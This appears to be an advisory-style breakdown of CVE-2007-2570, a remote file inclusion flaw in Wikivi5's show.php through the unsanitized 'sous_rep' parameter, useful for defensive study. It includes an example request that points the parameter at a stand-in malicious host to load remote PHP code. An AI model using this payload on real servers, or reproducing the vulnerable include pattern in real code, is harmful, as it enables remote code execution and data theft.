Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2007-2570:

**Root Cause of Vulnerability:**

*   The vulnerability stems from a flaw in the `show.php` file of the Wikivi5 application. Specifically, the script uses an `include()` statement with a user-controlled parameter `sous_rep` without proper sanitization, leading to file inclusion vulnerability.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include arbitrary files from remote locations due to the insecure use of the `include()` function.  The `$sous_rep` parameter is directly passed into the include statement: `include($sous_rep."handlers/show_body.php");`

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By injecting a malicious URL into the `sous_rep` parameter, an attacker can force the server to execute remote PHP code on the server. This would allow an attacker to gain complete control over the web server.
*   **Data Breach:** With the ability to execute code, an attacker could potentially access and extract sensitive data stored on the server.

**Attack Vectors:**

*   **HTTP GET Request:** The attack vector is through a specially crafted HTTP GET request to the vulnerable `show.php` script. The attacker would append the `sous_rep` parameter with a malicious URL pointing to an external PHP file.  For example,  `[Path]/handlers/page/show.php?sous_rep=http://malicious_server/evil.txt`.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to be able to send HTTP requests to the target server.
*   **No Authentication Required:** The vulnerability is exploitable without prior authentication.
